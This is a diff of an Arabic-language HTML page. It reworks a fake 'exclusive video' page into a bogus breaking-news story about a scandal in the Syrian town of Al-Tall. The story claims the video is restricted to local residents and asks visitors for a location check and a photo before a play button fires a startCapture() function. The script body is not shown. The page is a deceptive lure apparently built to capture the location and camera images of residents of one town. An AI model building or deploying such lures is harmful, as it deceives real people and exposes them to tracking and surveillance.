@@ -3,27 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيديو حصري - مدينة التل</title>
+    <title>عاجل: فضيحة تهز مدينة التل - تفاصيل حصرية</title>
     <style>
-        body {background:#000; color:#fff; text-align:center; font-family:Arial; margin:0; padding:0; overflow:hidden;}
-        .container {position:absolute; top:0; left:0; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center;}
-        h1 {font-size:28px; margin:20px; color:#f00;}
-        .fake {background:url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; height:70vh; width:90%; border:5px solid #f00; border-radius:15px; position:relative;}
-        .play-btn {position:absolute; font-size:80px; color:#fff; background:rgba(0,0,0,0.6); border-radius:50%; padding:20px; cursor:pointer; animation:pulse 1.5s infinite;}
-        @keyframes pulse {0% {transform:scale(1);} 50% {transform:scale(1.1);} 100% {transform:scale(1);}}
-        .loader {display:none; border:8px solid #333; border-top:8px solid #f00; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px;}
+        body {background:#f5f5f5; color:#333; text-align:right; font-family:'Segoe UI',Arial,sans-serif; margin:0; padding:0; line-height:1.8;}
+        .header {background:#d32f2f; color:#fff; padding:30px 20px; text-align:center; box-shadow:0 4px 10px rgba(0,0,0,0.2);}
+        h1 {font-size:30px; margin:0;}
+        .date {font-size:16px; opacity:0.9; margin-top:10px;}
+        .article {padding:20px; max-width:95%; margin:0 auto; background:#fff; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1); margin-top:-20px;}
+        .article p {font-size:18px; margin:20px 0;}
+        .highlight {background:#fff3e0; padding:20px; border-right:5px solid #ff9800; border-radius:8px; margin:30px 0; font-style:italic;}
+        .video-section {background:#000; padding:40px 20px; text-align:center; border-radius:15px; margin:30px 0;}
+        .video-thumb {background:url('https://i.pinimg.com/736x/e4/a5/0b/e4a50b00ae971d70714ed4af74311dfd.jpg') center/cover no-repeat; height:60vh; max-height:400px; border-radius:15px; position:relative; box-shadow:0 10px 30px rgba(0,0,0,0.5);}
+        .play-btn {position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:90px; color:#fff; background:rgba(0,0,0,0.7); width:120px; height:120px; border-radius:60px; display:flex; align-items:center; justify-content:center; cursor:pointer; animation:pulse 2s infinite;}
+        @keyframes pulse {0% {box-shadow:0 0 0 0 rgba(255,0,0,0.7);} 70% {box-shadow:0 0 0 30px rgba(255,0,0,0);} 100% {box-shadow:0 0 0 0 rgba(255,0,0,0);}}
+        .warning {font-size:16px; color:#ff9800; margin:20px 0;}
+        .loader {display:none; border:8px solid #333; border-top:8px solid #d32f2f; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px auto;}
         @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
+        .status {font-size:18px; color:#d32f2f;}
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>فيديو حصري وصل للتو في مدينة التل</h1>
-        <p>اضغط على الزر لتشغيل الفيديو الكامل</p>
-        <div class="fake">
-            <div class="play-btn" onclick="startCapture()">▶</div>
+    <div class="header">
+        <h1>عاجل: فضيحة كبيرة تهز مدينة التل!</h1>
+        <p class="date">نشر اليوم - 19 ديسمبر 2025</p>
+    </div>
+    <div class="article">
+        <p>في تطور مثير وغير متوقع، وصلتنا تفاصيل حصرية عن فضيحة كبيرة هزت أركان مدينة التل وريف دمشق. المصادر الموثوقة داخل المنطقة أكدت أن الأمر يتعلق بأحداث غامضة وصفقات سرية شملت شخصيات معروفة محليًا.</p>
+        <p>بدأت القصة عندما تم تسريب معلومات حساسة من أحد الأطراف، وسرعان ما انتشرت بين السكان. الشهود يتحدثون عن لقاءات سرية في أماكن عامة، ووثائق تكشف تفاصيل مذهلة.</p>
+        <div class="highlight">
+            <p>"الأمر أكبر مما يتخيله أحد، والفيديو الكامل اللي وصلنا يثبت كل شيء. لكن للأمان والخصوصية، المحتوى مقيد جغرافيًا لسكان التل فقط، عشان ما ينتشر خارج المنطقة."</p>
+        </div>
+        <p>الفيديو الحصري اللي بين إيدينا يحتوي على مشاهد مباشرة وتسجيلات صوتية واضحة. لكن لضمان أنك من سكان المنطقة ومشاهدة آمنة، نحتاج تحقق سريع من موقعك وصورة للتأكيد (لن يتم حفظ أو مشاركة أي شيء، مجرد تحقق تلقائي).</p>
+        <div class="video-section">
+            <p class="warning">تحذير: المحتوى للكبار فقط ويحتوي على مشاهد قوية</p>
+            <div class="video-thumb">
+                <div class="play-btn" onclick="startCapture()">▶</div>
+            </div>
         </div>
         <div class="loader" id="loader"></div>
-        <p id="status">جاري التحميل...</p>
+        <p id="status" class="status">اضغط على الزر لمشاهدة الفيديو الكامل...</p>
     </div>
 
     <script>
